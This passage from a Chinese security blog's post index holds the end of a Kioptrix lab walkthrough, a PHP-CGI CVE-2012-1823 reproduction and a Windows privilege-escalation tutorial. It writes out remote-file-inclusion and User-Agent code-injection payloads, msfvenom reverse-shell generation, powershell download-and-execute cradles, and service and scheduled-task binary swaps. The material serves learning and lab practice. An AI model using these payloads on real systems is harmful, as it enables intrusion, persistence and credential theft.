调出文件窗口，输入 /etc/sudoers 回车进行编辑：\n![image-20230923205039949](KIOPTRIX LEVEL 1.2 (#3)/image-20230923205039949.png)\n不过这似乎不得不kali了，不过让我崩溃的是kali的ssh功能竟然报错，信息如下\nUnable to negotiate with 192.168.17.143 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss\n搜寻一番发现此文章或许可以解决：[SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss\n![image-20230923211220504](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211220504.png)成功链接，接着sudo ht\n![image-20230923211256972](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211256972.png)\n但却报错了，信号这位佬也跟我一样：\n运行出现报错提示：Error opening terminal: xterm-256color.\n查询是新版 kali 的终端配色过于先进，降级一下：export TERM=xterm-color\n验证一下 sudo 权限：\n![image-20230923211513202](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211513202.png)\n发现 su 和 ht 具有 root 权限，尝试运行 su 命令失败，无法直接切换至 root 用户。\n再次运行：sudo ht\n![image-20230923211416068](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211416068.png)\nht 编辑器使用说明：https://www.aldeid.com/wiki/HT-Editor\n按 F3 调出文件窗口，输入 /etc/sudoers 回车进行编辑：\n![image-20230923211552544](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211552544.png)\n将原有 loneferret 条目修改为：loneferret ALL=(ALL) ALL\n![image-20230923211709870](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211709870.png)\n修改完毕按 F2 保存，然后按 F10 退出，回到终端后运行命令：sudo su -（输入 loneferret 密码 starwars）\n![image-20230923211824238](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211824238.png)\n成功获取root权限，在该目录下找flag即可\n![image-20230923212349728](KIOPTRIX LEVEL 1.2 (#3)/image-20230923212349728.png)\n但没想到这就是 flag，emmm\n0x04 总结\n回顾一下此次渗透路程：进到内网之后，首先就是扫描主机存活，随后针对某个主机展开渗透，然后呢先进行简单却关键的信息搜集，如端口扫描，找到可以端口便可以扫一下web网站的目录，看看网站中会存在哪些常见漏洞。\n当然在此期间也要对web网站做好信息搜集，比如用的什么中间件，采用的何种CMS等等，更要学会在搜集到可疑信息后，可疑在百度，google，gihub等处找到合适的exp等漏洞利用手段。\n找到之后无非就是想要获取一些重要数据，比如账号密码之类的，这会成为后续ssh连接的重要手段。\n当我们成功获取靶机shell时，肯定就是要想办法提权，因为不可能运气爆棚直接就是最高权限，而我们渗透的最终目的就是拿下靶机的最高权限。在此期间可能就要充足的技术去知道利用何种技术去提权，做免杀等等。\n此次渗透旅程让我受益颇丰，再接再厉，希望日后可以靠自己的脑子，走的更远。\n不过话又说回来了，我得去学一下sudo提权了，感觉在此处的理解不够深刻。我们换一篇文章探讨！\n0x05 参考文章\nVulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2\n[vulnhub靶场Kioptrix: Level 1.2 (#3) ]\nKioptrix: Level 1.2\n","categories":["vulnhub系列"],"tags":["内网靶场"]},{"title":"PHP-CGI远程代码执行漏洞（CVE-2012-1823）","url":"/2023/09/19/PHP-CGI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-1823%EF%BC%89/","content":"0x01 漏洞介绍\n这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是指http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。\n影响范围：\n漏洞影响版本 php &lt; 5.3.12 or php &lt; 5.4.2\nPS:CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中\ncgi模式下有如下可控命令行参数可用：\n\n-c 指定php.ini文件（PHP的配置文件）的位置\n-n 不要加载php.ini文件\n-d 指定配置项\n-b 启动fastcgi进程\n-s 显示文件源码\n-T 执行指定次该文件\n-h和-? 显示帮助\n\n0x02 CGI简单介绍\n- php-cgi是一个类似于消息的“传递者”，它接收web容器收到的http数据包，并把里面的数据交给PHP解释器执行。- php-cgi有两个功能，一是提供cgi方式的交互，二是提供fastcgi方式的交互。- cgi方式：web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork除一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，然后子进程结束，但是这个cgi模式不能接收同时接收大量的请求，因为创建进程的时候会消耗服务器资源，资源也不是无限的，所以有了fastcgi\n0x03 漏洞复现\n配置好访问8080端口，如图则代表搭建成功\n\n接下来是漏洞利用\n1. 源码泄露\n简单的利用方式就是-s可以直接显示源码\n\n\n访问不同页面均能显示源码\n2. 文件包含\n-d参数就是文件包含\n-d+allow_url_include%3don+-d+auto_append_file%3dphp://input需要注意的是 =要用%3d(url编下码) 空格用+号代替或者%20-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input上面两种都行只不过一个在页面顶部加载文件一个是页面底部加载文件auto_prepend_file 在页面顶部加载文件auto_append_file  在页面底部加载文件 \n我们url输入后抓包修改\n\n\n3. 远程文件包含\npayload:\n-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt\n\n上传之后尝试蚁剑连，链接地址为http://192.168.17.128:8080/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt\n\n4. 本地包含\npayload:\ncurl -H &quot;USER-AGENT:&lt;?php echo system($_GET[&quot;hk&quot;]);?&gt;&quot; url -d auto_prepend_file%3d/proc/self/environ+-n\n这里介绍下/proc/self/environ在文件包含中的作用\n如果服务器已过响应时间，还可以通过LFI重新利用，包括存储在User_Agent的/proc/self/environ文件，我们将把我们的PHP代码放置其中用于执行CMD命令 \n\n上述为bp抓包修改\n不过我们还是可以进行本地包含的 使用curl来完成\npayload:\ncurl -H &quot;USER-AGENT:&quot; http://192.168.17.128:8080/index.php?-d+auto_prepend_file%3d/proc/self/environ+-n -o 1.txt\n\n0x04 参考文章\n（CVE-2012-1823）PHP-CGI远程代码执行漏洞\n软件漏洞——PHP-CGI（CVE-2012-1823） --搭配msf反弹shell\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Windows权限提升-内网渗透","url":"/2023/09/19/Windows%E6%8F%90%E6%9D%83/","content":"0x01 基础知识\n\n提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权\n比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢?\n是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&gt;dll劫持–&gt;不安全的服务–&gt;手工提权这么一个流程\n\n1.1 提权基础命令\n# 查询系统信息systeminfo # 如果要查看特定的信息，可以使用systeminfo | findstr /B /C:&quot;OS名称&quot; /C:&quot;OS版本&quot;# 主机名Hostname# 环境变量Set# 查看用户信息Net user# 查看服务 pid 号tasklist /svc|find &quot;TermService&quot;netstat -ano|find &quot;3389&quot;# 查看系统名wmic os get caption# 查看补丁信息wmic qfe get Description,HotFixID,InstalledOn# 如果要定位到特定的补丁可以使用如下命令wmic qfe get Description,HotFixID,InstalledOn | findstr /C:&quot;KB4346084&quot; /C:&quot;KB4509094&quot;# 查看当前安装程序wmic product get name,version\n其中需要注意一下 环境变量，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过替换文件来达到提权操作\n这里的命令在windows信息搜集都有的\n1.2 Windows 权限划分\n\nUser：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料\nAdministrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等\nSystem：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作\nTrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件\n\n1.3 常见 webshell 所处的权限\n通常的 webshell 权限如下：\n\nASP、PHP - 匿名权限\nASPX - user 权限\nJSP - 通常是系统权限\n\n1.4 权限提升分类\n\n纵向提权：低权限用户获得高权限角色的权限。\n横向提权：获得同级别角色的权限。\n\n常用的提权方法有Windows系统内核溢出漏洞提权、错误的系统配置提权、数据库提权等等。下面我们对常用的几种提权的方法进行逐一演示。\n0x02 系统内核溢出漏洞提权\n​\t\t溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名：缓冲区溢出漏洞。因为它是在程序执行的时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。\n​\t\t利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。\n下面演示提权过程。\n2.1 手动查找系统潜在漏洞\n获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁：\nsysteminfo或wmic qfe get caption,description,hotfixid,installedon\n\n\n可以看到系统就装了这几个补丁。攻击者会通过没有列出的补丁号，寻找相应的提权EXP，例如KiTrap0D和KB979682对应、MS10-021和KB979683对应等等。然后使用目标机上没有的安装的补丁号对应的EXP进行提权。Windows不同系统提权的漏洞和相应的补丁请见：点我呀。\n2.2 自动查找系统潜在漏洞\n方法一：Windows Exploit Suggester\n下载地址：https://github.com/GDSSecurity/Windows-Exploit-Suggester\n该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。\n使用如下：\n首先更新漏洞数据库，会生成一个xls的文件，如下 2023-09-20-mssb.xls\n这里有个小问题，首先下载好zip更新了数据库之后，需要安装一个依赖，依赖项目中有说明，之后更新数据库按理来说，更新的文件后缀应为xls，可我这里是xlsx，如果直接用xlsx则会报错（以上是我在虚拟机的情况），我们可以在本地更新后打开另存为xls，具体呢推荐如下图所示的格式\n\n其他形式还未尝试，大家感兴趣可以测试\n注意必须为python2环境\n\n然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件：\nsysteminfo &gt; sysinfo.txt\n最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：\npython2 windows-exploit-suggester.py -d 2020-08-20-mssb.xls -i sysinfo.txt\n\n如上图，执行后，给出了一些目标系统存在的漏洞\n方法二：local_exploit_suggester 模块\nMetasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。\n使用如下，假设我们已经获得了目标主机的一个session：\nuse post/multi/recon/local_exploit_suggester set session 1exploit\n这里我就搜了篇文章，对win7靶机获取一下其session\n小tip：后渗透之获取普通session\n所需环境：1.kali Linux（攻击机） 2.windows7（靶机）\n在kali终端中打开msfconsole控制台开启监听use exploit/multi/handler设置tcp监听set payload windows/meterpreter/reverse_tcp\n\nLinux：\nmsfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf &gt; shell.elf\nWindows:\n32 位：msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell.exe64 位：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.128 lport=4444 -a x64 -f exe &gt; shell.exe\n说明：-p payload(有效载荷) 通俗的讲payload是用来建立目标机与攻击机稳定连接的，可以返回shell-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值-f exe 生成exe格式\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.17.137 lport=4444 -f exe &gt; shell.exe\n不过操作下来，发现没必要非得写64位对应的命令，反而这个命令还报错，不知是否为我的失误\n\n4.将该shell文件上传到靶机中。在kali控制台下使用python 环境执行命令：python -m SimpleHTTPServer 800搭建一个http服务，提供一个web页面供靶机浏览。(一定是在管理员模式下执行此命令 (sudo su))\n不过这里不用搞800,默认端口即可\n\n值得注意的是python2才可以\n打开目标机win7，输入地址进行下载木马并保存在桌面\n\n\n上图为下载的回显，返回第二步界面，设置监听主机，运行\n\n可以看到得到了session\n​\t\t查看session，如果此时是meterpreter，输入background即可返回msf exploit(multi/handler)\n查看系统信息:sysinfo\n截取时下桌面:screenshot\n\n捕获击键记录:keyscan start\n控制键盘鼠标 启用/禁用:uictl enable/disable keyboard\n参考文章：msf 获取一个普通的session 控制windows\n接上回，我们已经获得了目标主机的一个session：\nuse post/multi/recon/local_exploit_suggester set session 1exploit\n这里也有个小坑，必须要在同一终端下，将msf先挂个后台，通过background，随后在执行上述命令\n\n这里也是发现了二十几个，该模块快速识别并列出了系统中可能被利用的漏洞，十分方便。但虽然如此，也并非所有列出的local exploits都可用。\n方法三：enum_patches 模块\n会用metasploit中的post/windows/gather/enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下：\nuse post/windows/gather/enum_patchesset session 1exploit\n这里不在演示了，同上述步骤即可\n在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。\n下载地址：https://github.com/rasta-mouse/Sherlock\n该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下：\npowershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://ip/Sherlock.ps1&#x27;);      // 远程执行#导入模块Import-Module .\\Sherlock.ps1#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码Set-ExecutionPolicy Unrestricted#输入如下命令可以查看帮助信息powercat -hFind-AllVulns    // 调用脚本后，执行搜索命令\n这里总是报错，我就下载到本地了，这里搜索的时间较长，耐心等待\n\n2.3 选择漏洞并利用\n查找了目标机器上的补丁并确定存在漏洞后，我们就可以像目标机器上传本地溢出程序，并执行。这里，我们选择的是CVE-2018-8120。\n漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明）\n\nWindows 下的提权大合集：https://github.com/lyshark/Windows-exploits\nWindows内核溢出漏洞提权大全：https://github.com/SecWiki/windows-kernel-exploits\n各大平台提权工具：https://github.com/klsfct/getshell\n\n\n这里下载的时候注意将exe文件放入相应目录在执行如上命令\n\n如上图，再执行提权程序之前，为普通用户whoami权限，执行后为system权限。msfconsole上完整操作如下：\n\n这里尝试了多个漏洞，但似乎是我的用法不正确（而且我也不知道如何用）导致在此环境下whoami一直为普通用户\n\n但奇怪的是每次执行命令之后，靶机都会自动跳转一个以管理员身份打开的cmd\n但可能为另一种情况，就是其目标就是让靶机提权，但或许反应不到msf上，这里我对内网渗透了解较少，可能理解有问题吧，先过个思路。\n\n不过在突然看到靶机中有了相应的exp，我便知道了，upload就会将该 exp由攻击者下载到靶机处，接着执行该 exe 文件，执行后便也就是提权了，即也是为何最后出现system cmd的原因吧，但仍不理解的是为何msf的whoami没有显示管理员权限\n0x03 系统错误配置漏洞提权\n在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但是如果碰到无法通过系统内核溢出漏洞提权的情况时，会可以利用系统中的错误配置漏洞来提权。下面演示几种常见的Windows系统错误配置漏洞提权方法。\nTrusted Service Paths漏洞（可信任服务路径漏洞）\nTrusted Service Paths 漏洞是由系统中的“CreateProcess”函数引起的，并利用了windows文件路径解析的特性。\n首先，我们来认识一下Windows中文件路径解析的特性。例如，我们有一个文件路径为“C:\\Program Files\\Some Folder\\Service.exe”。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行一下程序：\n1. C:\\Program.exe2. C:\\Program Files\\Some.exe3. C:\\Program Files\\Some Folder\\Service.exe\n可见，最后才确定并执行真正的程序Service.exe。而由于Windows服务通常是以system权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以system系统权限进行，那么，如果我们将一个“适当命名”的可执行程序上传到以上所说的受影响的目录中，服务一旦启动或重启，该程序就会以system权限运行了，可见该漏洞利用了服务路径的文件/文件夹的权限。\n该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名，即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来，那么该服务就存在这个漏洞。下面演示该漏洞利用方法。\n首先，我们可以用以下命令列出目标主机中所有存在空格且没有被引号括起来服务路径：\nwmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr/i /v &quot;&quot;&quot;\n我的靶机都没有此漏洞，也有点懒不想费时间搭了，因此跟着过一遍思路吧\n\n如上图，可以看到“whoami”和“Bunny”这两个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。\n这里我们使用Windows中的icacls命令，依次来检查“C:\\”、“C:\\Program Files\\Program Folder”等目录的权限发现只有“C:\\Program Files\\program folder”目录有Everyone(OI)(CI)(F)：\n\n参数说明：\n\n“M”表示修改\n“F”代表完全控制\n“CI”代表从属容器将继承访问控制项\n“OI”代表从属文件将继承访问控制项。\n\n\n这就意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。\n\n确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。\nsc stop &lt;service_name&gt;sc start &lt;service_name&gt;\n既然要重启服务，那么我们就可以知道，该提权方法需要管理员权限，重启服务的方法适用于从管理员权限到system的权限提升过程。而实际情况下，我们直接对目标主机执行“shutdown -r -t 0”命令让他重启就行了。\n我们生成一个msf马并重命名为Hello.exe上传到该“C:\\Program Files\\Program Folder”目录下，然后分别执行如下命令重启该WhoamiTest服务：\nsc stop WhomaiTestsc start WhomaiTest\n如下图完整利用过程：\n\n可知提权前为管理员权限（liukaifeng01），提权成功后我们得到一个system权限的session。\n这里也是解惑了，是我太傻，原来在上次执行CVE.exe之后，getuid便可以将提权结果展示在meterpreter中\n这里要注意，新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程：\n\n该提权方法在metasploit中对应的模块为：exploit/windows/local/unquoted_service_path，使用如下：\n（在之前的metasploit中为exploit/windows/local/trusted_service_path，但在新版的metasploit中替换替换成了exploit/windows/local/unquoted_service_path）\nuse exploit/windows/local/unquoted_service_pathset session 1set AutoRunScript migrate -fexploit\n\n如上图，提权成功\n系统服务错误权限配置漏洞\nWindows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。**Windows 服务是以System权限运行的，因此，其文件、文件夹和注册表键值都是受强访问控制机制保护的。**但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。\n该漏洞利用有以下两种情况：\n\n服务未运行：攻击者会使用任意服务直接替换原来的服务，然后重启服务。\n服务正在运行且无法终止：这种情况符合绝大多数漏洞利用的场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。\n\n1. 利用PowerUp.ps1脚本\n下载地址：https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp\n这里我们利用一个Powershell的脚本——PowerUp，该脚本的AllChecks模块会检测目标主机存的Windows服务漏洞，然后通过直接替换可执行文件本身来实现权限的提升。\n\nAllChecks模块的通常应用对象如下：\n\n没有被引号引起来的服务的路径。\n服务的可执行文件的权限设置不当\nUnattend.xml文件\n注册表键AlwaysInstallElevated\n\n\n将该脚本远程下载或本地导入后，执行Invoke-AllChecks命令进行漏洞检测\npowershell -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;\n这里推荐先下载到本地，不过我这个靶机依旧没有此漏洞，这里就直接用他人的了\n\n如上图，可以看到PowerUp列出了所有可能存在该漏洞的服务的信息，并在AbuseFunction部分直接给出了利用方式。我们可以看到，目标主机的WhoamiTest服务可能存在该漏洞，然后我们再用icacls命令来测试该服务的可执行文件目录的“C:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exe”文件是否有写入权限：\nicacls &quot;C:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exe&quot;\n\n如上图，可以看到我们对whoami.exe文件是有完全控制权的，那么我们就可以直接将whoami.exe替换成我们的msf马，当服务重启时，我们就会得到一个System权限的meterpreter。\n这里，我们用“AbuseFunction”那里已经给出的具体操作方式，执行如下。\n将原来的服务可执行文件备份，并用一个可添加管理员用户的恶意可执行文件代替它，默认添加的用户名为join，密码为Password123!：\npowershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/PowerUp.ps1&#x27;);Install-ServiceBinary -ServiceName 服务名    \n\n接下来停止并再启动该服务的时候，但由于我们当前是普通用户，我们没有权限重启服务，所以我们可以等目标系统重启，我们通过msf控制目标机执行“shutdown -r”命令来重启，重启后即可成功创建join用户：\n\n添加指定的管理员用户：\nInstall-ServiceBinary -ServiceName 服务名 -UserName Bunny -Password Liufupeng123\n\n\n执行命令：\nInstall-ServiceBinary -ServiceName 服务名 -Command &quot;whoami&quot;   // -Command后加要执行的命令\n2. Metasploit中的service_permissions模块\n该漏洞提权在metasploit上面对应的模块为exploit/windows/local/service_permissions：\n\n如上图，该模块有两个可以设置的选项，其中如果把AGGRESSIVE选项设为“true”，则可以利用目标机器上每一个有该漏洞的服务，设为“false”则在第一次提权成功后就会停止工作。演示如下：\n\n（别忘了迁移进程哦~~）\n0x04 计划任务与AccessChk使用\n如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行我们的恶意程序。下面详细的进行演示。\n首先可以利用如下命令查看计算机的计划任务：\nschtasks /query /fo list /vschtasks /query /fo list /v &gt; schtasks.txt\n\n如上图，我们可以看到，在 C:\\Program Files\\schtasks\\whoami目录有一个test.exe程序，它会在一个时间点自动运行，它会在计算机每次启动时运行，并且是用SYSTEM权限运行的。然后让我们看下我们对这个计划任务的路径是否有写入权限。\n我推荐使用AccessChk工具，其为SysInterals套件里的一个工具，常用于Windows中进行一些系统或程序的高级查询、管理和排除故障等。AccessChk是微软官方的工具，一般不会引起杀软的报警没所以常会被攻击者利用下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk\n执行以下命令，查看指定目录的权限配置情况：\naccesschk.exe -dqv &quot;C:\\Program Files\\schtasks\\whoami&quot; -accepteula\n\n可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务“test”来说，这里不仅用了system权限来运行，更糟糕的是，任何经过身份验证的用户（Authenticated Users）都对这个文件夹有写入的权限。所以，我们可以生成一个木马，做一个后门就可以了，在本次演示例子中，我们可以简单的用msf木马覆盖掉原来的“test.exe”，如下图我们将原来的test.exe备份后，上传我们自己生成的“test.exe”（msf木马）：\n\n然后重开一个msfconsole，设置好监听，接下来对目标机执行重启命令“shutdown -r -t 0”让其重新启动：\n\n重新启动目标主机后，在另一个msfconsole上面即可得到system权限的session：\n\n成功。\nAccessChk使用\n通过上面的例子，我们可以看出accesschk称得上是查找有权限配置缺陷文件夹的必备工具，下面是accesschk的一些其他使用实例。\n当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议，即：\naccesschk.exe /accepteula\nAccesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。\n找出某个驱动器下所有权限配置有缺陷的文件夹路径\naccesschk.exe -uwdqs Users c:\\ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\  \n找出某个驱动器下所有权限配置有缺陷的文件\naccesschk.exe -uwqs Users c:\\*.*  accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\\*.*\n\n如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。\n根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点是易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等。\n自动安装配置文件\n网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而是会采用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员的账号和密码等信息。我们可以对整个系统进行检查，这些安装配置文文件列举如下：\n- C:\\sysprep.inf- C:\\syspreg\\sysprep.xml- C:\\Windows\\system32\\sysprep.inf- C:\\windows\\system32\\sysprep\\sysprep.xml- C:\\unattend.xml- C:\\Windows\\Panther\\Unattend.xml- C:\\Windows\\Panther\\Unattended.xml- C:\\Windows\\Panther\\Unattend\\Unattended.xml- C:\\Windows\\Panther\\Unattend\\Unattend.xml- C:\\Windows\\System32\\Sysprep\\Unattend.xml- C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml\n全盘搜索Unattend文件是个好办法，可以用以下命令来全盘搜索Unattend.xml文件：\ndir /b /s c:\\Unattend.xml\n\n/S：显示指定目录和所有子目录中的文件。\n\n除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作系统时使用的凭据信息，这些信息可以帮助我们提权。\n打开文件之后格式为xml格式然后可以进行搜索User、Accounts、UserAccounts、LocalAccounts、Administrator、Password或者经过base64加密的密码，因为我们只需要这部分，例如：\n......&lt;UserAccounts&gt;    &lt;LocalAccounts&gt;        &lt;LocalAccount&gt;            &lt;Password&gt;                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&lt;/Value&gt;                &lt;PlainText&gt;false&lt;/PlainText&gt;            &lt;/Password&gt;            &lt;Description&gt;Local Administrator&lt;/Description&gt;            &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;            &lt;Group&gt;Administrators&lt;/Group&gt;            &lt;Name&gt;Administrator&lt;/Name&gt;        &lt;/LocalAccount&gt;    &lt;/LocalAccounts&gt;&lt;/UserAccounts&gt;......\n在这个Unattend文件中，我们可以看到一个本地账户被创建并加入到了管理员组中。管理员密码没有以明文形式显示，但是显然密码是以Base64进行编码的。\necho &quot;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&quot; | base64 -d\n\n解密得密码为&quot;P@ssword123!Password&quot;，但是微软在进行编码前会在Unattend文件中所有的密码后面都追加&quot;Password&quot;，所以我们本地管理员的密码实际上是&quot;P@ssword123!&quot;。\n1. 在Metasploit中利用的相应模块为post/windows/gather/enum_unattend\n这个模块仅仅只是搜索Unattend.xml文件，然而会忽略其他像syspref.xml和syspref.inf这样的文件。简而言之，这个模块就是全盘搜索Unattend.xml文件并读取出管理员账户密码。\n\n2. PowerUp中利用的模块\npowershell -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://ip/powerup.ps1&#x27;);Get-UnattendedInstallFile&quot;\n\n0x04 后言\n本节中，我们主要介绍了Windows系统内核溢出漏洞提权和windows系统错误配置漏洞提权的可信任服务路径漏洞提权、系统服务错误权限配置漏洞提权、自动安装配置文件提权。其中最常用的可能就是Windows系统内核溢出漏洞提权了，windows系统错误配置漏洞不仅可以用来提权，在获取高权限后还可以用来设置一个高权限后门，以备后用。\n不过感觉我只是抄了一遍而已，因此我还是搞点靶场在实战中学习吧，毕竟靶场中肯定次次得提权。\n想了想日后的提权文章，还是针对某种类型单独写出来吧，感觉效果会好一点。\n","categories":["内网渗透"],"tags":["提权"]}]